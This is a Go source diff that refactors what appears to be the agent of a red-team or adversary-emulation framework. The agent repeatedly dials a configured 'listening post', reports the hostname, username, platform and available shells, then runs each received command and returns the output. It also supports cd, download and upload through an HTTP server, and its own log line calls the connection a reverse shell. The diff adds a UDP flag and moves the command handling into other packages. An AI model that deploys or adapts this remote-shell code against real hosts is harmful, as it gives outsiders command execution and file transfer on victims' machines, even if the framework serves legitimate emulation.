@@ -1,9 +1,7 @@
 package main
 
 import (
-   "bytes"
    "bufio"
-   "os/exec"
    "fmt"
    "net"
    "strings"
@@ -14,69 +12,18 @@ import (
    "flag"
    "strconv"
 
+   "./util"
    "./output"
    "./commands"
 )
 
 var shellInfo, httpServer, paw string
 
-func determineExecutor(platform string, arch string) string {
-	platformExecutors := map[string]map[string][]string {
-		"windows": {
-			"file": {"cmd.exe", "powershell.exe", "pwsh.exe"},
-			"executor": {"cmd", "psh", "pwsh"},
-		},
-		"linux": {
-			"file": {"sh", "pwsh"},
-			"executor": {"sh", "pwsh"},
-		},
-		"darwin": {
-			"file": {"sh", "pwsh"},
-			"executor": {"sh", "pwsh"},
-		},
-   }
-   var executors bytes.Buffer
-   for platformKey, platformValue := range platformExecutors {
-      if platform == platformKey {
-         for i := range platformValue["file"] {
-            if checkIfExecutorAvailable(platformValue["file"][i]) {
-               executors.WriteString(platformExecutors[platformKey]["executor"][i] + ",")
-            }
-         }
-      }
-   }
-	return executors.String()
-}
-
-func checkIfExecutorAvailable(executor string) bool {
-	_, err := exec.LookPath(executor)
-	return err == nil
-}
-
-func runNextCommand(message string) ([]byte, int) {
-   if strings.HasPrefix(message, "cd") {
-      pieces := strings.Split(message, "cd")
-      bites := commands.ChangeDirectory(pieces[1])
-      return bites, 0
-   } else if (strings.HasPrefix(message, "download")) {
-      pieces := strings.Split(message, "download")
-      go commands.Download(httpServer, pieces[1])
-      return []byte("Download initiated\n"), 0
-   } else if (strings.HasPrefix(message, "upload")) {
-      pieces := strings.Split(message, "upload")
-      go commands.Upload(httpServer, pieces[1], shellInfo)
-      return []byte("Upload initiated\n"), 0
-   } else {
-      bites, status := commands.Execute(message)
-      return bites, status
-   }
-}
-
 func listen(conn net.Conn, paw []byte) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
         message := scanner.Text()
-        bites, status := runNextCommand(strings.TrimSpace(message))
+        bites, status := commands.RunCommand(strings.TrimSpace(message), httpServer)
         statusBites := []byte(fmt.Sprintf("%s$", strconv.Itoa(status)))
         response := append(paw, statusBites...)
         conn.Write(append(response, bites...))
@@ -100,16 +47,19 @@ func main() {
    user, _ := user.Current()
    platform := runtime.GOOS
    architecture := runtime.GOARCH
-   executors := determineExecutor(platform, architecture)
+   executors := util.DetermineExecutors(platform, architecture)
    shellInfo = fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)
 
    verbose := flag.Bool("v", false, "Enable verbose output")
    tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
+   udp := flag.String("udp", "127.0.0.1:5679", "The IP of the TCP listening post")
    http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
    flag.Parse()
    httpServer = *http
 
    output.SetVerbose(*verbose)
+   output.VerbosePrint(fmt.Sprintf("[*] TCP socket: %s", *tcp))
+   output.VerbosePrint(fmt.Sprintf("[*] UDP socket: %s", *udp))
 
    for {
       conn, err := net.Dial("tcp", *tcp)
@@ -117,7 +67,7 @@ func main() {
          fmt.Println(fmt.Sprintf("[-] %s", err))
       } else {
           paw = handshake(conn)
-          fmt.Println(fmt.Sprintf("[+] reverse-shell established for %s", paw))
+          output.VerbosePrint(fmt.Sprintf("[+] reverse-shell established for %s", paw))
           listen(conn, []byte(fmt.Sprintf("%s$", paw)))
       }
       time.Sleep(5 * time.Second)
